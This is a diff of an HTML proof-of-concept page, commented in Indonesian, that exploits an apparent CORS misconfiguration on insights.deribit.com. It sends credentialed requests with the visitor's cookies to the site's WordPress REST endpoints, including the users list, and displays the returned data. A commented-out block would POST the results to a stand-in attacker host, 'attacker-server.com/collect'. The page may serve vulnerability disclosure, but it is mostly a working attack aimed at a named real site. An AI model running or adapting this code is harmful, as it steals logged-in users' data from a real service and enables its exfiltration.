@@ -1,49 +1,61 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CORS Vulnerability PoC</title>
+    <title>CORS Vulnerability PoC - insights.deribit.com</title>
 </head>
 <body>
     <h1>CORS Misconfiguration PoC</h1>
+    <p>Mengakses data dari insights.deribit.com dengan kredensial pengguna yang sedang login...</p>
     <div id="result">Loading...</div>
 
     <script>
-        // Fungsi untuk menampilkan hasil dengan format
-        function displayResult(data) {
+        // Array endpoint yang akan dicoba akses
+        const endpoints = [
+            'https://insights.deribit.com/wp-json',
+            'https://insights.deribit.com/wp-json/wp/v2/users',
+            'https://insights.deribit.com/wp-json/wp/v2/posts'
+        ];
+
+        // Melakukan request ke semua endpoint
+        Promise.all(endpoints.map(url => 
+            fetch(url, {
+                credentials: 'include' // Mengirimkan cookie pengguna jika ada
+            })
+            .then(response => {
+                if (!response.ok) {
+                    return { url, status: response.status, error: `Error: ${response.status}` };
+                }
+                return response.json().then(data => ({ url, status: response.status, data }));
+            })
+            .catch(error => ({ url, error: error.toString() }))
+        ))
+        .then(results => {
             const resultDiv = document.getElementById('result');
+            let html = '<h2>CORS PoC Results:</h2>';
             
-            // Mengkonversi objek ke string JSON dengan format yang rapi
-            const formattedData = JSON.stringify(data, null, 2);
-            resultDiv.innerHTML = '<h3>Data Berhasil Diakses:</h3><pre>' + formattedData + '</pre>';
-        }
+            results.forEach(result => {
+                html += `<h3>${result.url}</h3>`;
+                html += `<p>Status: ${result.status || 'Error'}</p>`;
+                
+                if (result.data) {
+                    html += '<pre>' + JSON.stringify(result.data, null, 2).substring(0, 500) + '... (truncated)</pre>';
+                } else if (result.error) {
+                    html += `<p style="color: red">${result.error}</p>`;
+                }
+                html += '<hr>';
+            });
+            
+            resultDiv.innerHTML = html;
 
-        // Fungsi untuk menampilkan error
-        function displayError(error) {
-            const resultDiv = document.getElementById('result');
-            resultDiv.innerHTML = '<h3>Error:</h3><p style="color: red;">' + error + '</p>';
-        }
-
-        // Lakukan permintaan CORS ke endpoint WP-JSON
-        fetch('https://insights.deribit.com/wp-json/wp/v2/users', {
-            method: 'GET',
-            credentials: 'include', // Penting: Mengirim kredensial (cookie) jika ada
-            headers: {
-                'X-Test': 'CORS-PoC'
+            // Menambahkan exfiltration data untuk demo
+            if (results.some(r => r.data)) {
+                console.log("Exfiltrating data to attacker server would happen here");
+                // Dalam PoC nyata, Anda bisa menambahkan kode untuk mengirim data ke server attacker
+                // fetch('https://attacker-server.com/collect', { 
+                //     method: 'POST',
+                //     body: JSON.stringify(results)
+                // });
             }
-        })
-        .then(response => {
-            if (!response.ok) {
-                throw new Error('Network response was not ok: ' + response.status);
-            }
-            return response.json();
-        })
-        .then(data => {
-            console.log('Data received:', data);
-            displayResult(data);
-        })
-        .catch(error => {
-            console.error('Error:', error);
-            displayError(error.toString());
         });
     </script>
 </body>
